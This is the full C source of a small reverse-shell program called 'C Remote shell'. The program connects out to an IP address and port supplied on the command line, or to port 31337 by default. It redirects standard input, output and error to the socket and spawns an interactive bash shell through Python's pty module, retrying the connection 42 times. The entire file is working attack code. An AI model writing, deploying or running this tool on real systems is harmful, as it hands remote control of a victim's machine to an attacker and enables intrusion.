/**

   C Remote shell
   Written by Lp1 <lp1.eu>
   inspired by :

   https://gist.github.com/0xabe-io/916cf3af33d1c0592a90

**/
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>


#define  DEFAULT_PORT	31337
#define	 TRIES		42

int usage(char *argv0) {
  printf("usage : %s ip (port)\n", argv0);
  return 1;
}

int connect_remote(char *remote_addr, int remote_port) {
  struct sockaddr_in sa;
  int s;
  int connect_out;

  sa.sin_family = AF_INET;
  sa.sin_addr.s_addr = inet_addr(remote_addr);
  sa.sin_port = htons(remote_port);
  s = socket(AF_INET, SOCK_STREAM, 0);
  connect_out = connect(s, (struct sockaddr *)&sa, sizeof(sa));
  if (connect_out == -1) {
    return -1;
  }
  printf("Connection established\n");
  dup2(s, 0);
  dup2(s, 1);
  dup2(s, 2);
  system("/usr/bin/env python -c 'import pty; pty.spawn(\"/bin/bash\")'");
}

int main(int argc, char *argv[])
{
    char *remote_addr;
    int remote_port;

    if (argc < 2) {
      return usage(argv[0]);
    } else if (argc < 3) {
      remote_port = DEFAULT_PORT;
    } else {
      remote_port = atoi(argv[2]);
    }
    remote_addr = argv[1];
    printf("Connecting to %s:%i...\n", remote_addr, remote_port);
    for (char i = 0; i < TRIES; i++) {
      connect_remote(remote_addr, remote_port);
      sleep(1);
      printf("\r");
      for (char j = 0;j < i+1; j++) {
	printf(".");
      }
      printf("\n");
    }
    return 0;
}
